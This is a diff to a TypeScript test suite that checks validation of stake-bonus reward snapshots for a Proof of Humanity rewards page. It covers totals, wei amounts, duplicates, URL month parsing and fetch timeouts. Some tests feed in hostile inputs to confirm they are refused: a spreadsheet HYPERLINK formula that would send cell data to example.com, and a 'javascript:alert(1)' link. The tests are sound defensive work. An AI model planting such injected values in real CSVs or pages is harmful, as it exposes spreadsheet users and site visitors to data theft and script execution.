@@ -2,6 +2,7 @@ import assert from "node:assert/strict";
 import { readFileSync } from "node:fs";
 import test from "node:test";
 
+import { fetchJson } from "../src/utils/fetchSnapshots.ts";
 import {
   aggregate,
   bonusRewards,
@@ -88,26 +89,86 @@ test("a snapshot the page can't trust is refused whole, saying why", () => {
   refuses((raw) => ({ ...raw, recipients: [] }), /no recipients/);
   refuses((raw) => void (raw.recipients["0x1234"] = raw.recipients[A]), /recipient "0x1234" isn't an address/);
   refuses((raw) => void ((raw.recipients[A] as { stakeBonus: unknown }).stakeBonus = "1200"), /has no stakeBonus lines/);
-  // the docs' hard rules: each recipient's total and the grand total are the sum of the lines
+  // the docs' hard rules: each recipient's total and every total are the sum of the lines, recipientCount is right
   refuses((raw) => void (raw.recipients[A].total = "1"), /lines don't add up to its total/);
-  refuses((raw) => void (raw.totals.total = (3600n * PNK).toString()), /its lines add up to .* but its total is/);
-  // an amount that isn't a decimal wei string reads as 0, which then fails the totals check
-  refuses((raw) => void (raw.recipients[A].stakeBonus[0].amount = "1.2e21"), /lines don't add up to its total/);
+  refuses((raw) => void (raw.totals.total = (3600n * PNK).toString()), /its lines add up to .* but totals.total is/);
+  refuses((raw) => void (raw.totals.stakeBonus = "0"), /but totals.stakeBonus is "0"/);
+  refuses((raw) => void (raw.totals.recipientCount = 3), /totals.recipientCount is 3, but it has 2 recipients/);
+  refuses((raw) => ({ ...raw, totals: undefined }), /totals.stakeBonus undefined isn't a decimal wei string/);
 });
 
-test("a malformed transaction hash or window end is dropped rather than linked or shown", () => {
+test("an amount that isn't a positive decimal wei string is refused, not read as 0", () => {
+  // all of them, so no sum check could catch it: every line and total would read as 0
+  const every = (amount: unknown) => {
+    const raw = snapshot() as unknown as Record<string, any>;
+    for (const recipient of Object.values(raw.recipients) as any[]) {
+      recipient.total = amount;
+      for (const l of recipient.stakeBonus) l.amount = amount;
+    }
+    raw.totals.stakeBonus = amount;
+    raw.totals.total = amount;
+    return raw;
+  };
+  for (const amount of [1.2e21, "1.2e21", "1200.0", "0x41", "-1200", "+1200", "01200", "", null]) {
+    assert.throws(() => bonusRewards(NOVEMBER_URL, every(amount)), /isn't a decimal wei string/, String(amount));
+  }
+  // a negative line made up for by a bigger one elsewhere
   const raw = snapshot();
-  raw.recipients[A].stakeBonus[0].txHash = "javascript:alert(1)";
-  raw.recipients[A].stakeBonus[0].windowEnd = "soon";
-  const [reward] = bonusRewards(NOVEMBER_URL, raw);
-  assert.equal(reward.txHash, undefined);
-  assert.equal(reward.windowEnd, undefined);
+  raw.recipients[A].stakeBonus[0].amount = (-1200n * PNK).toString();
+  raw.recipients[B].stakeBonus[0].amount = (3600n * PNK).toString();
+  assert.throws(() => bonusRewards(NOVEMBER_URL, raw), /isn't a decimal wei string/);
+  assert.throws(() => bonusRewards(NOVEMBER_URL, every("0")), /pays nothing/);
 });
 
-test("the snapshot month comes from the URL's file name", () => {
+test("a line that isn't a payment is refused, not counted", () => {
+  for (const bad of [null, 5, "x", []]) {
+    const raw = snapshot() as unknown as Record<string, any>;
+    raw.recipients[A].stakeBonus.push(bad);
+    assert.throws(() => bonusRewards(NOVEMBER_URL, raw), /line 2 isn't a payment/, JSON.stringify(bad));
+  }
+});
+
+test("a humanity ID, transaction or time that isn't one is refused", () => {
+  const refuses = (field: string, value: unknown, why: RegExp) => {
+    const raw = snapshot() as unknown as Record<string, any>;
+    raw.recipients[A].stakeBonus[0][field] = value;
+    assert.throws(() => bonusRewards(NOVEMBER_URL, raw), why, `${field}=${String(value)}`);
+  };
+  // it would land in the CSV, where a spreadsheet runs it
+  refuses("humanityId", '=HYPERLINK("https://example.com/"&A1,"x")', /humanity ID .* isn't an address/);
+  refuses("humanityId", undefined, /humanity ID undefined isn't an address/);
+  refuses("txHash", "javascript:alert(1)", /isn't a transaction hash/);
+  refuses("paidAt", "2026-10-31T23:59:59.000Z", /paidAt "2026-10-31T23:59:59.000Z" isn't a time in 2026-11/);
+  refuses("paidAt", "1", /isn't a time in 2026-11/);
+});
+
+test("the same payment twice in a snapshot is refused", () => {
+  const raw = snapshot();
+  raw.recipients[A].stakeBonus.push(line(A, "2026-08-06"));
+  raw.recipients[A].total = (2400n * PNK).toString();
+  raw.totals.stakeBonus = raw.totals.total = (3600n * PNK).toString();
+  assert.throws(() => bonusRewards(NOVEMBER_URL, raw), /lists the payment to 0x5be1.* twice/);
+});
+
+test("a malformed window end is dropped rather than shown", () => {
+  const raw = snapshot();
+  raw.recipients[A].stakeBonus[0].windowEnd = "soon";
+  assert.equal(bonusRewards(NOVEMBER_URL, raw)[0].windowEnd, undefined);
+});
+
+test("error messages quote the snapshot briefly", () => {
+  const raw = snapshot();
+  raw.schema = "x".repeat(500);
+  assert.throws(() => bonusRewards(NOVEMBER_URL, raw), (error: Error) => error.message.length < 120);
+});
+
+test("the snapshot month comes from the URL's file name, as the build's index check reads it", () => {
   assert.equal(snapshotMonth(NOVEMBER_URL), "2026-11");
+  // the build validates the path, so a query string passes it: read the same path here
+  assert.equal(snapshotMonth("https://cdn.kleros.link/ipfs/Qm/poh-stake-bonus-2026-12.json?filename=x"), "2026-12");
   assert.equal(snapshotMonth("https://cdn.kleros.link/ipfs/Qm/poh-stake-bonus-2026-13.json"), null);
   assert.equal(snapshotMonth("https://cdn.kleros.link/ipfs/Qm/curate-rewards-2026-11.json"), null);
+  assert.equal(snapshotMonth("not a url"), null);
 });
 
 test("every published URL in the bundled index names its month", () => {
@@ -149,6 +210,30 @@ test("a human paid the airdrop and the stake bonus is one human, and one wallet 
     stakeBonus: 1200n * PNK,
     total: 2400n * PNK,
   });
+});
+
+test("a wallet's humanity ID comes from its airdrop claim, whatever a snapshot says", () => {
+  const raw = snapshot();
+  raw.recipients[A].stakeBonus[0].humanityId = B;
+  const rewards = [...bonusRewards(NOVEMBER_URL, raw), claim(A, A, "2026-02-06T15:28:10.000Z")];
+  assert.equal(walletTotals(rewards).find((w) => w.address === A)!.humanityId, A);
+});
+
+test("a snapshot fetch that gets no answer gives up after its timeout", async () => {
+  const realFetch = globalThis.fetch;
+  // a gateway that never answers, as with a CID nobody pins
+  globalThis.fetch = ((_url: string, init?: RequestInit) =>
+    new Promise((_resolve, reject) => init?.signal?.addEventListener("abort", () => reject(init.signal!.reason)))) as typeof fetch;
+  // AbortSignal.timeout's timer doesn't keep Node's event loop alive on its own
+  const keepAlive = setInterval(() => undefined, 100);
+  try {
+    const started = Date.now();
+    await assert.rejects(fetchJson("https://cdn.kleros.link/ipfs/Qm/poh-stake-bonus-2026-11.json", 1, 1000), /no answer within 1 s/);
+    assert.ok(Date.now() - started < 3000);
+  } finally {
+    clearInterval(keepAlive);
+    globalThis.fetch = realFetch;
+  }
 });
 
 test("a wallet whose humanity ID differs keeps it, and humans are counted by humanity", () => {
